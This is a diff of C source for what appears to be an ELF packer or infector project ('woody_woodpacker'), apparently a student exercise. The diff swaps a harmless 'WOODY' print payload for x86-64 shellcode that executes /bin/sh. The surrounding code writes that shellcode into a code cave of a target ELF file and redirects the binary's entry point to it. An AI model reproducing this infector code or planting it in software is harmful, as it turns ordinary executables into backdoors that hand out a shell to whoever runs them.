@@ -1,7 +1,10 @@
 #include "../inc/woody_woodpacker.h"
 
-char payload[] = { '\x50','\x57','\x56','\x52','\xb8','\x01','\x00','\x00','\x00','\xbf','\x01','\x00','\x00','\x00','\x48','\xbe','\x00','\x00','\x00','\x00','\x00','\x00','\x00','\xba','\x0f','\x00','\x00','\x00','\x0f','\x05','\x5a','\x5e','\x5f','\x58','\x2e','\x2e','\x2e','\x2e','\x57','\x4f','\x4f','\x44','\x59','\x2e','\x2e','\x2e','\x2e','\x2e','\x0a'};
-
+// char payload[] = { '\x50','\x57','\x56','\x52','\xb8','\x01','\x00','\x00','\x00','\xbf','\x01','\x00','\x00','\x00','\x48','\xbe','\x00','\x00','\x00','\x00','\x00','\x00','\x00','\xba','\x0f','\x00','\x00','\x00','\x0f','\x05','\x5a','\x5e','\x5f','\x58','\x2e','\x2e','\x2e','\x2e','\x57','\x4f','\x4f','\x44','\x59','\x2e','\x2e','\x2e','\x2e','\x2e','\x0a'};
+char payload[] = {"\x48\x31\xf6\x56\x48\xbf"\
+		  "\x2f\x62\x69\x6e\x2f"\
+		  "\x2f\x73\x68\x57\x54"\
+		  "\x5f\xb0\x3b\x99\x0f\x05"};
 int is_infected(void)
 {
     if (g_elf.hdr.e_shnum == 0)
@@ -35,7 +38,7 @@ void find_caves(Elf64_Shdr shdr, char c, size_t min)
     if (max >= min)
     {
         printf("max cave in %s found for character %d: %lu bytes\n", get_section_name(shdr.sh_name), c, max);
-        g_elf.cave_offset = shdr.sh_offset + i;
+        g_elf.cave_offset = shdr.sh_offset + i + 6;
     }
     // if (!infected)
     //     ft_memcpy()
@@ -44,17 +47,17 @@ void find_caves(Elf64_Shdr shdr, char c, size_t min)
 void write_payload()
 {
     Elf64_Addr offset;
-    Elf64_Addr woody;
+    // Elf64_Addr woody;
 
     offset = g_elf.cave_offset;
-    woody = offset + 38;
+    //woody = offset + 38;
     g_elf.woodyfd = open("woody", O_RDWR);
-    ft_memcpy((void*)&payload + WOODY_LEN, &woody, sizeof(woody));
+    //ft_memcpy((void*)&payload + WOODY_LEN, &woody, sizeof(woody));
     lseek(g_elf.woodyfd, offset, SEEK_SET);
     write(1, ft_strchr(payload, '.'), WOODY_LEN);
     for (long unsigned int i = 0; i < sizeof(payload); ++i)
         write(g_elf.woodyfd, &payload[i], 1);
-    printf("file infected from offset %lu: 0x%08lx. woody offset: 0x%08lx\n", offset, offset, woody);
+    printf("file infected from offset %lu: 0x%08lx\n", offset, offset);
     lseek(g_elf.woodyfd, 0, SEEK_SET);
     printf("entry before:\t0x%08lx\n", g_elf.hdr.e_entry);
     g_elf.hdr.e_entry = offset;
